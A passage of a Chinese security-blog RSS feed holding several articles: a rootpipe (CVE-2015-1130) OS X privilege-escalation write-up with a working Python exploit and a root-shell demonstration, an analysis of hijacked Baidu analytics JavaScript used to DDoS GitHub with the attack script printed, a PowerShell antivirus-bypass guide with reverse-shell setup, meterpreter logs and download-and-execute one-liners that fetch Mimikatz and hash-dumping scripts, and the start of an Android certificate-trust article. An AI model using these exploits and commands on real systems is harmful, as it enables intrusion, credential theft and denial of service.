&amp;gt; systemsetup
&amp;gt; type -help for help.
&lt;/code&gt;&lt;p&gt;到目前为止，我们只是回到之前的systemsetup（10.8.5之前），你可以用systemsetup执行命令的一个例子：&lt;/p&gt;&lt;br&gt;&lt;code lang=&quot;text&quot;&gt;$ systemsetup –setremotelogin on
&lt;/code&gt;&lt;p&gt;这将在22端口上开启ssh服务，当然你也可以通过launchtl开启，但是launchtl需要root权限。所以这在权限上还是有很明显的区别的。&lt;/p&gt;&lt;p&gt;类名为RemoteServerSettings表明，有某种进程间通信可以解释为什么需要root操作执行。不过还是要提一下，通过System Preferences开启SSH服务也不需要root权限。&lt;/p&gt;&lt;p&gt;我发现这种权限的差异非常有趣，继续反编译systemsetup。&lt;/p&gt;&lt;p&gt;通过一个名字叫做[ServerSettings setRemoteLogin:]的方法实现了systemsetup中的setremotelogin命令。&lt;/p&gt;&lt;p&gt;函数做了一些输入检查，然后调用[InternetServices setSSHServerEnabled:]，这是在Admin框架中实现。反编译Admin框架可以看到setSSHServerEnabled并不是InternetServices接口的唯一方法，清单如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;+[InternetServices sharedInternetServices]
+[InternetServices sharedInternetServices].sSharedInternetServices
-[InternetServices _netFSServerFrameworkBundle]
-[InternetServices _netFSServerFrameworkBundle].sNetFSServerkBundle
-[InternetServices _netFSServerFrameworkBundle].sNetFSServerkBundleOnce
-[InternetServices faxReceiveEnabled]
-[InternetServices ftpServerEnabled]
-[InternetServices httpdEnabled]
-[InternetServices isFTPServerAvailable]
-[InternetServices isFaxReceiveAvailable]
-[InternetServices isGuestForProtocolEnabled:]
-[InternetServices isHttpdAvailable]
-[InternetServices isNSCProtocolAvailable:]
-[InternetServices isNSCProtocolEnabled:]
-[InternetServices isNSServerShuttingDown:]
-[InternetServices isOpticalDiscSharingEnabled]
-[InternetServices isRemoteAEServerAvailable]
-[InternetServices isSSHServerAvailable]
-[InternetServices nscServerCancelShutdown:refNum:]
-[InternetServices nscServerShutdown:withDelay:]
-[InternetServices numberOfClientsForProtocols:]
-[InternetServices remoteAEServerEnabled]
-[InternetServices saveNatPrefs:]
-[InternetServices screensharingEnabled]
-[InternetServices sendSIGHUPToEfax]
-[InternetServices setFTPServerEnabled:]
-[InternetServices setFaxReceiveEnabled:]
-[InternetServices setGuestForProtocol:enabled:]
-[InternetServices setHttpdEnabled:]
-[InternetServices setInetDServiceEnabled:enabled:]
-[InternetServices setNSCProtocols:enabled:]
-[InternetServices setOpticalDiscSharingEnabled:]
-[InternetServices setRemoteAEServerEnabled:]
-[InternetServices setSSHServerEnabled:]
-[InternetServices setScreensharingEnabled:]
-[InternetServices sshServerEnabled]
_OBJC_CLASS_$_InternetServices
_OBJC_METACLASS_$_InternetServices
___47-[InternetServices _netFSServerFrameworkBundle]_block_invoke&lt;/code&gt;&lt;p&gt;一些例如setHttpdEnabled和setSSHServerEnabled共享一个辅助方法[ADMInternetServices setInetDServiceEnabled:enabled:]。&lt;/p&gt;&lt;p&gt;继续看Admin框架代码，发现：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/826645d6b70a718891fda948e2badfb4_r.jpg&quot; data-rawwidth=&quot;715&quot; data-rawheight=&quot;544&quot;&gt;&lt;p&gt;代码看来是为guest账户创建一个用户特定的Apache配置文件，注意root用户是这个文件的拥有者：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$ ls -l /etc/apache2/users/
total 8
-rw-r--r-- 1 root wheel 139 Apr 1 05:49 std.conf
&lt;/code&gt;&lt;p&gt;&lt;b&gt;0x02 发现后门&lt;/b&gt;&lt;/p&gt;&lt;p&gt;上面截图的代码中最后一个被调用的Objective-C方法是createFileWithContents:path:attributes:&lt;/p&gt;&lt;p&gt;他获取一个组数组包括字节数，文件路径，文件属性。&lt;/p&gt;&lt;p&gt;自己代码中使用这个函数是这个样子的：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;[tool createFileWithContents:data
                        path:[NSString stringWithUTF8String:target]
                  attributes:@{ NSFilePosixPermissions : @0777 }];
&lt;/code&gt;&lt;p&gt;问题在于我们如何控制“tool”，再看一看开始的代码截图：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;id sharedClient =
    [objc_lookUpClass(&quot;WriteConfigClient&quot;) sharedClient];
id tool = [sharedClient remoteProxy];&lt;/code&gt;&lt;p&gt;当我尝试我自己的代码的时候，爆出error错误：&lt;/p&gt;&lt;p&gt;### Attempt to send message without connection!&lt;/p&gt;&lt;p&gt;下面找出如何出现这个错误的：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/2b4fa230fb40cffa036e5052cf7ae917_r.jpg&quot; data-rawwidth=&quot;1270&quot; data-rawheight=&quot;715&quot;&gt;&lt;p&gt;这是检查XPC代理在我的进程中是否启动，看一下_onewayMessageDispatcher来定位初始代码：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/2c4547428053d1d96a9bd811367de654_r.jpg&quot; data-rawwidth=&quot;464&quot; data-rawheight=&quot;145&quot;&gt;&lt;p&gt;实际初始化的地方就是authenticateUsingAuthorization方法。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/65f95416cffcf961443e332d4c5361d5_r.jpg&quot; data-rawwidth=&quot;776&quot; data-rawheight=&quot;620&quot;&gt;&lt;br&gt;&lt;p&gt;这正是我想要的，给writeconfig XPC服务创建一个XPC客户端，并且这个服务是以root权限运行的。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/86ac44840aea1ca30fce961427f2b174_r.jpg&quot; data-rawwidth=&quot;513&quot; data-rawheight=&quot;137&quot;&gt;&lt;p&gt;唯一的问题就是我应该给authenticateUsingAuthorization传递什么参数，从systemsetup文件当中找到如下：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/e51c84c17fa8929757c65e3aa3f13bd6_r.jpg&quot; data-rawwidth=&quot;794&quot; data-rawheight=&quot;374&quot;&gt;&lt;p&gt;看起来[SFAuthorization authorization]可以来做触发，下面是我的新的exp：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;id auth = [objc_lookUpClass(&quot;SFAuthorization&quot;) authorization];

id sharedClient =

    [objc_lookUpClass(&quot;WriteConfigClient&quot;) sharedClient];

[sharedClient authenticateUsingAuthorizationSync: auth];

id tool = [sharedClient remoteProxy];


[tool createFileWithContents:data

                        path:[NSString stringWithUTF8String:target]

                  attributes:@{ NSFilePosixPermissions : @04777 }];&lt;/code&gt;&lt;p&gt;文件最终创建，setuid已经设置：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;-rwsrwxrwx 1 root wheel 25960 Apr 1 19:29 rootpipe.tmp
&lt;/code&gt;&lt;p&gt;既然setuid已经设置并且拥有者是root，我们就有有了一个提权漏洞。&lt;/p&gt;&lt;p&gt;上面的代码适用于10.9及以后版本，10.7.x和10.8.x有些类文件名略不相同。&lt;/p&gt;&lt;p&gt;但是上面的代码仍然有一个问题，只可以在admin的权限下运行，之前提到过几乎所有的OS X用户都是admin。&lt;/p&gt;&lt;p&gt;最终找到一个适用所有用户使用的方法，很简单，只要把[SFAuthorization authorization]:的结果替换为发送nil到authenticateUsingAuthorizationSync。&lt;/p&gt;&lt;p&gt;[sharedClient authenticateUsingAuthorizationSync: nil];&lt;/p&gt;&lt;p&gt;&lt;b&gt;0x03 Timeline&lt;/b&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Oct 2nd 2014: First discovery
Oct 3rd 2014: First contact with Apple Product Security Team
Oct 14th 2014: Exploit code shared with Apple
Oct 24th 2014: Initial full disclosure date set to Jan 12th 2015
Oct 16th 2014: Release of OS X 10.10 Yosemite, vulnerable to rootpipe
Nov 14th 2014: Apple requested to postpone disclosure
Nov 17th 2014: Release of OS X 10.10.1, also vulnerable
Jan 12th 2015: Joint decision between Apple and TrueSec to postpone disclosure due to the amount of changes required in OS X
Jan 16th 2015: CVE-2015-1130 created by Apple
Jan 27th 2015: Release of OS X 10.10.2, also vulnerable
March 2nd 2015: Release of OS X 10.10.3 public beta, issue solved
April 1st 2015: Apple confirmed that release is coming the second week of April
April 8th 2015: Release of OS X 10.10.3
April 9th 2015: Full disclosure&lt;/code&gt;&lt;p&gt;&lt;b&gt;0x04 EXP&lt;/b&gt;&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;########################################################
#
#  PoC exploit code for rootpipe (CVE-2015-1130)
#
#  Created by Emil Kvarnhammar, TrueSec
#
#  Tested on OS X 10.7.5, 10.8.2, 10.9.5 and 10.10.2
#
########################################################
import os
import sys
import platform
import re
import ctypes
import objc
import sys
from Cocoa import NSData, NSMutableDictionary, NSFilePosixPermissions
from Foundation import NSAutoreleasePool

def load_lib(append_path):
    return ctypes.cdll.LoadLibrary(&quot;/System/Library/PrivateFrameworks/&quot; + append_path);

def use_old_api():
    return re.match(&quot;^(10.7|10.8)(.\d)?$&quot;, platform.mac_ver()[0])


args = sys.argv

if len(args) != 3:
    print &quot;usage: exploit.py source_binary dest_binary_as_root&quot;
    sys.exit(-1)

source_binary = args[1]
dest_binary = os.path.realpath(args[2])

if not os.path.exists(source_binary):
    raise Exception(&quot;file does not exist!&quot;)

pool = NSAutoreleasePool.alloc().init()

attr = NSMutableDictionary.alloc().init()
attr.setValue_forKey_(04777, NSFilePosixPermissions)
data = NSData.alloc().initWithContentsOfFile_(source_binary)

print &quot;will write file&quot;, dest_binary

if use_old_api():
    adm_lib = load_lib(&quot;/Admin.framework/Admin&quot;)
    Authenticator = objc.lookUpClass(&quot;Authenticator&quot;)
    ToolLiaison = objc.lookUpClass(&quot;ToolLiaison&quot;)
    SFAuthorization = objc.lookUpClass(&quot;SFAuthorization&quot;)

    authent = Authenticator.sharedAuthenticator()
    authref = SFAuthorization.authorization()

    # authref with value nil is not accepted on OS X &amp;lt;= 10.8
    authent.authenticateUsingAuthorizationSync_(authref)
    st = ToolLiaison.sharedToolLiaison()
    tool = st.tool()
    tool.createFileWithContents_path_attributes_(data, dest_binary, attr)
else:
    adm_lib = load_lib(&quot;/SystemAdministration.framework/SystemAdministration&quot;)
    WriteConfigClient = objc.lookUpClass(&quot;WriteConfigClient&quot;)
    client = WriteConfigClient.sharedClient()
    client.authenticateUsingAuthorizationSync_(None)
    tool = client.remoteProxy()

    tool.createFileWithContents_path_attributes_(data, dest_binary, attr, 0)
print &quot;Done!&quot;
del pool&lt;/code&gt;&lt;p&gt;&lt;b&gt;0x05 译者测试&lt;/b&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;[test@test:~]$ cp /bin/bash bashceshi 
[test@test:~]$ python CVE-2013-1775.py bashceshi bashroot
will write file /Users/test/Downloads/bashroot
Done! 
[test@test:~]$ ./bashroot -p
bashroot-3.2# id
uid=501(test) gid=20(staff) euid=0(root) groups=20(staff),501(access_bpf),402(com.apple.sharepoint.group.1),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),33(_appstore),100(_lpoperator),204(_developer),398(com.apple.access_screensharing),399(com.apple.access_ssh)
&lt;/code&gt;</description>
<author>瞌睡龙</author>
<guid isPermaLink="false">2015-04-10-19999291</guid>
<pubDate>Fri, 10 Apr 2015 00:00:00 +0800</pubDate>
</item>
<item>
<title>百度统计js被劫持用来DDOS Github</title>
<link>https://henix.github.io/feeds/zhuanlan.drops/2015-03-27-19987510.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/19987510&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
from:&lt;a href=&quot;http://drops.wooyun.org/papers/5398&quot; data-editable=&quot;true&quot; data-title=&quot;百度统计js被劫持用来DDOS Github&quot; class=&quot;&quot;&gt;百度统计js被劫持用来DDOS Github&lt;/a&gt;&lt;p&gt;author:insight-labs&lt;/p&gt;&lt;h2&gt;0x00 背景&lt;/h2&gt;&lt;p&gt;今天中午刷着全国最大的信息安全从业人员同性交友社区zone.wooyun.org的时候，忽然浏览器每隔2秒就不断的弹窗：“malicious javascript detected on this domain”&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/616c1bc835fdc3bbdd098c32aee47b04_r.jpg&quot; data-rawwidth=&quot;1440&quot; data-rawheight=&quot;820&quot;&gt;&lt;br&gt;&lt;p&gt;我第一反应就是不知道哪个调皮的基友又把zone给XSS了，马上打开开发者工具分析。&lt;/p&gt;&lt;h2&gt;0x01 细节&lt;/h2&gt;&lt;p&gt;之后立刻发现弹窗的js居然是从github加载的：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/1fcf76a99899df43f32e441daa294571_r.jpg&quot; data-rawwidth=&quot;1091&quot; data-rawheight=&quot;323&quot;&gt;&lt;p&gt;可是为什么乌云会从github加载js呢，并且还是从greatfire和纽约时报镜像加载。&lt;/p&gt;&lt;p&gt;第一反应是页面有xss或者js被劫持了，找了半天终于找到了，居然是&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;hm.baidu.com/h.js
&lt;/code&gt;&lt;p&gt;这个js的确被乌云加载了没错，这是百度统计的js代码，打开后里面是一个简单加密后的js，eval了一串编码后的内容，随便找了个在线解密看了下，发现如下内容:&lt;/p&gt;&lt;br&gt;&lt;br&gt;&lt;code lang=&quot;js&quot;&gt;document.write(&quot;&amp;lt;script src=&#39;http://libs.baidu.com/jquery/2.0.0/jquery.min.js&#39;&amp;gt; /script&amp;gt;&quot;);
!window.jQuery &amp;amp;&amp;amp; document.write(&quot;&amp;lt;script src=&#39;http://code.jquery.com/jquery-latest.js&#39;&amp;gt; /script&amp;gt;&quot;);
startime = (new Date).getTime();
var count = 0;
 
function unixtime() {
    var a = new Date;
    return Date.UTC(a.getFullYear(), a.getMonth(), a.getDay(), a.getHours(), a.getMinutes(), a.getSeconds()) / 1E3
}
url_array = [&quot;https://github.com/greatfire/&quot;, &quot;https://github.com/cn-nytimes/&quot;];
NUM = url_array.length;
 
function r_send2() {
    var a = unixtime() % NUM;
    get(url_array[a])
}
 
function get(a) {
    var b;
    $.ajax({
        url: a,
        dataType: &quot;script&quot;,
        timeout: 1E4,
        cache: !0,
        beforeSend: function() {
            requestTime = (new Date).getTime()
        },
        complete: function() {
            responseTime = (new Date).getTime();
            b = Math.floor(responseTime - requestTime);
            3E5 &amp;gt; responseTime - startime &amp;amp;&amp;amp; (r_send(b), count += 1)
        }
    })
}
 
function r_send(a) {
    setTimeout(&quot;r_send2()&quot;, a)
}
setTimeout(&quot;r_send2()&quot;, 2E3);&lt;/code&gt;&lt;br&gt;&lt;p&gt;大概功能就是关闭缓存后每隔2秒加载一次&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;url_array = [&quot;https://github.com/greatfire/&quot;, &quot;https://github.com/cn-nytimes/&quot;];
&lt;/code&gt;&lt;p&gt;里面的两个url&lt;/p&gt;&lt;p&gt;问了下墙内的小伙伴们，他们看到的js都是正常的，但是通过墙外ip访问&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://hm.baidu.com/h.js
&lt;/code&gt;&lt;p&gt;就会得到上面的js文件，每隔2秒请求一下这两个url。&lt;/p&gt;&lt;p&gt;打开twitter看了下，似乎从3月18号以来Github就受到了DDoS攻击，之后greatfire把被攻击的页面内容换成了&lt;/p&gt;&lt;br&gt;&lt;br&gt;alert(&quot;WARNING: malicious javascript detected on this domain&quot;)&lt;br&gt;&lt;p&gt;以弹窗的方式阻止了js的循环执行。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/42107b0bbaec07b29700785c83365069_r.jpg&quot; data-rawwidth=&quot;970&quot; data-rawheight=&quot;729&quot;&gt;&lt;p&gt;图3 国外ip traceroute到hm.baidu.com的记录&lt;/p&gt;&lt;p&gt;似乎DNS并没有被劫持，看来是像之前一样直接把IP劫持了或者直接在HTTP协议里替换文件。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/8952e8ad4c954b7537558663217d3a0f_r.jpg&quot; data-rawwidth=&quot;1440&quot; data-rawheight=&quot;860&quot;&gt;&lt;br&gt;&lt;p&gt;扫了下端口，只开了80和443，通过https协议访问后是正常的空页面(只有带referer才会出现js文件)。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/d936f71ace2269907e32c510bb119bd3_r.jpg&quot; data-rawwidth=&quot;505&quot; data-rawheight=&quot;248&quot;&gt;&lt;br&gt;&lt;p&gt;作者要进行抓包分析时劫持已经停止，在&lt;a href=&quot;https://twitter.com/mac_zhou/status/581324446058713088&quot; data-editable=&quot;true&quot; data-title=&quot;twitter&quot; class=&quot;&quot;&gt;twitter&lt;/a&gt;上看到有人已经分析过引用如下：&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;抓包跟踪，正常百度服务器返回给我日本VPS的TTL为51， RESP返回HTTP 200 OK的报文的TTL是47，可以确定的是有中间设备对VPS发了伪造报文。&lt;/p&gt;&lt;/blockquote&gt;&lt;img src=&quot;https://pic2.zhimg.com/f93903e66267c93481cfd5b7cde31742_r.jpg&quot; data-rawwidth=&quot;566&quot; data-rawheight=&quot;473&quot;&gt;&lt;br&gt;&lt;p&gt;真是无耻，呵呵&lt;/p&gt;&lt;p&gt;忽然想起一句话,之前DNS被劫持到外国服务器的时候某站长说的:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;They have weaponized their entire population.
&lt;/code&gt;&lt;p&gt;现在应该是:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;They have weaponized their entire population of the Earth.&lt;/code&gt;</description>
<author>瞌睡龙</author>
<guid isPermaLink="false">2015-03-27-19987510</guid>
<pubDate>Fri, 27 Mar 2015 00:00:00 +0800</pubDate>
</item>
<item>
<title>Powershell tricks::Bypass AV</title>
<link>https://henix.github.io/feeds/zhuanlan.drops/2014-10-27-19878773.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/19878773&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;0x00 Powershell 简介&lt;/h2&gt;&lt;p&gt;Powershell犹如linux下的bash，并且在windows中Powershell可以利用.NET Framework的强大功能，也可以调用windows API，在win7/server 2008以后，powershell已被集成在系统当中。 Powershell强大的功能特性给windows管理带来了极大的便利，同时也更加便于windows下的渗透测试。&lt;/p&gt;&lt;h2&gt;0x01 PowerShell Execution Policy&lt;/h2&gt;&lt;p&gt;Powershell脚本默认情况下无法双击或在cmd下执行。在执行时需要通过一些方法绕过该策略。 最简单的方法就是执行powershell.exe附加需要执行的命令，也可以将要执行的脚本直接复制进powershell的窗口。 当然也可以Download and execute，如下面示例中一样。&lt;/p&gt;&lt;p&gt;如果需要执行ps1文件时，也可以这样：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;PowerShell.exe -ExecutionPolicy Bypass -File .\runme.ps1
&lt;/code&gt;&lt;p&gt;不建议使用其他方法全局改变执行策略，如果场景不同可以根据&lt;a href=&quot;https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershell-execution-policy&quot; data-editable=&quot;true&quot; data-title=&quot;参考&quot;&gt;参考&lt;/a&gt;自行选择执行方式。&lt;/p&gt;&lt;h2&gt;0x02 Reverse the Shell&lt;/h2&gt;&lt;p&gt;在遇到防护软件时，可以使用powershell执行shellcode返回shell。执行脚本可以用msf生成，也可以用set工具包生成，注意的是msf生成的ps1文件，而set生成的是bat文件。 下面是在set中生成的过程：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Select from the menu:

   1) Social-Engineering Attacks
   2) Fast-Track Penetration Testing
   3) Third Party Modules
   4) Update the Metasploit Framework
   5) Update the Social-Engineer Toolkit
   6) Update SET configuration
   7) Help, Credits, and About

  99) Exit the Social-Engineer Toolkit

set&amp;gt; 1

..SNIP...

 Select from the menu:

   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
   6) Arduino-Based Attack Vector
   7) SMS Spoofing Attack Vector
   8) Wireless Access Point Attack Vector
   9) QRCode Generator Attack Vector
  10) Powershell Attack Vectors
  11) Third Party Modules

  99) Return back to the main menu.

set&amp;gt; 10

The Powershell Attack Vector module allows you to create PowerShell specific attacks. These attacks will allow you to use PowerShell which is available by default in all operating systems Windows Vista and above. PowerShell provides a fruitful  landscape for deploying payloads and performing functions that  do not get triggered by preventative technologies.

   1) Powershell Alphanumeric Shellcode Injector
   2) Powershell Reverse Shell
   3) Powershell Bind Shell
   4) Powershell Dump SAM Database

  99) Return to Main Menu

set:powershell&amp;gt;1
set&amp;gt; IP address for the payload listener: 192.168.200.159
set:powershell&amp;gt; Enter the port for the reverse [443]:4444
[*] Prepping the payload for delivery and injecting alphanumeric shellcode...
[*] Generating x86-based powershell injection code...
[*] Finished generating powershell injection bypass.
[*] Encoded to bypass execution restriction policy...
[*] If you want the powershell commands and attack, they are exported to /root/.set/reports/powershell/
set&amp;gt; Do you want to start the listener now [yes/no]: : yes

..SNIP...

[*] Processing /root/.set/reports/powershell/powershell.rc for ERB directives.
resource (/root/.set/reports/powershell/powershell.rc)&amp;gt; use multi/handler
resource (/root/.set/reports/powershell/powershell.rc)&amp;gt; set payload windows/meterpreter/reverse_tcp
payload =&amp;gt; windows/meterpreter/reverse_tcp
resource (/root/.set/reports/powershell/powershell.rc)&amp;gt; set lport 4444
lport =&amp;gt; 4444
resource (/root/.set/reports/powershell/powershell.rc)&amp;gt; set LHOST 0.0.0.0
LHOST =&amp;gt; 0.0.0.0
resource (/root/.set/reports/powershell/powershell.rc)&amp;gt; exploit -j
[*] Exploit running as background job.
msf exploit(handler) &amp;gt; 
[*] Started reverse handler on 0.0.0.0:4444 
[*] Starting the payload handler...
[*] Sending stage (769024 bytes) to 192.168.200.158
[*] Meterpreter session 1 opened (192.168.200.159:4444 -&amp;gt; 192.168.200.158:49818) at 2014-10-23 18:17:35 +0800

msf exploit(handler) &amp;gt; sessions 

Active sessions
===============

  Id  Type                   Information                               Connection
  --  ----                   -----------                               ----------
  1   meterpreter x86/win32  WIN-M49V8M0CSH2\server @ WIN-M49V8M0CSH2  192.168.200.159:4444 -&amp;gt; 192.168.200.158:49818 (192.168.200.158)
&lt;/code&gt;&lt;p&gt;生成的文件在/root/.set/reports/powershell/下。 其中x86_powershell_injection.txt为bat文件，可以直接改名运行。 在这里有个技巧可以通过powershell一句话直接下载文件。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;powershell (new-object System.Net.WebClient).DownloadFile( &#39;http://192.168.200.159/backdoor&#39;,&#39;backdoor.bat&#39;)
&lt;/code&gt;&lt;p&gt;然后再执行就可以得到meterpreter会话了。&lt;/p&gt;&lt;p&gt;并且可以正常执行cmd命令、dump hash明文等操作。&lt;/p&gt;&lt;h2&gt;0x03 Dump the hash&lt;/h2&gt;&lt;p&gt;当然在仅仅需要dump hash时，也可以借助powershell来完成。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#39;);Get-PassHashes
&lt;/code&gt;&lt;h2&gt;0x04 Dump the plain Password&lt;/h2&gt;&lt;p&gt;同样也可以用下面的方式(执行powershell版的Mimikatz)获取明文。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz –DumpCerts
&lt;/code&gt;&lt;p&gt;值得注意的是在这里也可以通过Command参数执行Mimikatz命令。&lt;/p&gt;&lt;h2&gt;0x05 Memory Dumping&lt;/h2&gt;&lt;p&gt;Powershell也可以完成像procdump一样的工作，获取某个进程的dumps。 这里演示获取lsass.exe的dumps，然后再用Mimikatz从dumps中获取明文。&lt;/p&gt;&lt;p&gt;然后将lsass dumps文件下载回来用Mimikatz分析可以得到明文密码。&lt;/p&gt;&lt;p&gt;当然内存dumps不仅仅可以获取windows密码，往往进程内存中或许会储存其他重要的信息或数据。参考&lt;a href=&quot;http://blog.spiderlabs.com/2012/07/pentesting-like-an-eastern-european.html&quot; data-editable=&quot;true&quot; data-title=&quot;Pentesting like an Eastern European&quot;&gt;Pentesting like an Eastern European&lt;/a&gt;。&lt;/p&gt;&lt;h2&gt;0x06 Execute the shellcode&lt;/h2&gt;&lt;p&gt;Powershell由于丰富的扩展功能使得其调用windows API非常方便，所以同样也可以执行shellcode，这一过程如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1&#39;); Invoke-Shellcode –help
&lt;/code&gt;&lt;p&gt;但是在这里有个问题，就是x64下shellcode已有的很少，往往通过网上搜集的shellcode都是x86的。如果直接执行x86的shellcode则会出错。&lt;/p&gt;&lt;p&gt;不过Invoke-Shellcode.ps1脚本默认是将shellcode注入在powershell.exe进程中，那么便可以用64位系统环境下32位的powershell.exe执行x86的shellcode，过程如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1&#39;); Invoke-Shellcode -Shellcode 0x90,0x90,0x90 ...
&lt;/code&gt;&lt;p&gt;并且这一过程适用于大部分msfpayload生成的shellcode。当然在windows下执行shellcode也可以用其它的方法，比如&lt;a href=&quot;https://github.com/inquisb/shellcodeexec&quot; data-editable=&quot;true&quot; data-title=&quot;shellcodeexec&quot;&gt;shellcodeexec&lt;/a&gt;。不过这个方法并不能bypass AV。但是大家可以根据源码自行bypass。&lt;/p&gt;&lt;p&gt;未完待续。&lt;/p&gt;</description>
<author>瞌睡龙</author>
<guid isPermaLink="false">2014-10-27-19878773</guid>
<pubDate>Mon, 27 Oct 2014 00:00:00 +0800</pubDate>
</item>
<item>
<title>Android证书信任问题与大表哥</title>
<link>https://henix.github.io/feeds/zhuanlan.drops/2014-10-23-19875587.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/19875587&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;0x00 起因&lt;/h2&gt;&lt;p&gt;1、近期icloud.com、yahoo.com、apple.com遭遇到大规模劫持&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-080117&quot; data-editable=&quot;true&quot; data-title=&quot;WooYun: Yahoo雅虎在国内访问遭遇SSL中间人攻击（被替换为自签名证书）&quot; class=&quot;&quot;&gt;WooYun: Yahoo雅虎在国内访问遭遇SSL中间人攻击（被替换为自签名证书）&lt;/a&gt;&lt;/p&gt;&lt;p&gt;2、乌云平台、CVE都收到大量有关Android APP信任所有证书的漏洞&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-079358&quot; data-editable=&quot;true&quot; data-title=&quot;WooYun: 国内绝大部分Android APP存在信任所有证书漏洞&quot;&gt;WooYun: 国内绝大部分Android APP存在信任所有证书漏洞&lt;/a&gt;&lt;/p&gt;&lt;p&gt;3、老外写有关大表哥的文章中提到MITM时360浏览器不提示证书错误&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://www.computerworld.com/article/2836084/chinese-big-brother-launches-nationwide-attack-on-icloud.html&quot; data-editable=&quot;true&quot; data-title=&quot;Chinese Big Brother launches nationwide attack on iCloud&quot; class=&quot;&quot;&gt;Chinese Big Brother launches nationwide attack on iCloud&lt;/a&gt;&lt;/p&gt;&lt;p&gt;之前信任证书问题一直都有被提到，但是普遍不受大家重视，因为这个漏洞是利用是需要场景的：MITM（中间人攻击 Man-in-the-middle attack）。一般情况下MITM相对其他攻击是比较少见的，如果有良好的上网习惯如不接入不受信任的网络，那就更少可能受此类攻击了。但是近期发生的MITM据传是在核心骨干网BGP上做了改动所以劫持范围非常之广，真是防不胜防呀，你被劫持了么？&lt;/p&gt;&lt;h2&gt;0x01 科普&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;https&amp;amp;&amp;amp;ssl&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;为了提高网站的安全性，一般会在比较敏感的部分页面采用https传输，比如注册、登录、控制台等。像Gmail、网银、icloud等则全部采用https传输。https/ssl主要起到两个作用：网站认证、内容加密传输和数据一致性。经CA签发的证书才起到认证可信的作用，所有有效证书均可以起到加密传输的作用。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;数字证书&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;主要在互联网上的用于身份验证的用途。 安全站点在获得CA（Certificate Authority数字证书认证机构）认证后，获得一个数字证书，以此来标识其合法身份的真实性。数字证书主要分为服务器证书和客户端证书。服务器证书（SSL证书）用来进行身份验证和通信的加密，客户端证书主要用于身份验证和电子签名。找CA申请证书是要收费的。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;自签名证书&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;非CA颁发的证书，通过自签名的方式得到的证书。通常Web浏览器会显示一个对话框，询问您是否希望信任一个自签名证书。这个是不用花钱的。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;中间人攻击&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;是指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。在许多情况下这是很简单的。&lt;/p&gt;&lt;h2&gt;0x02 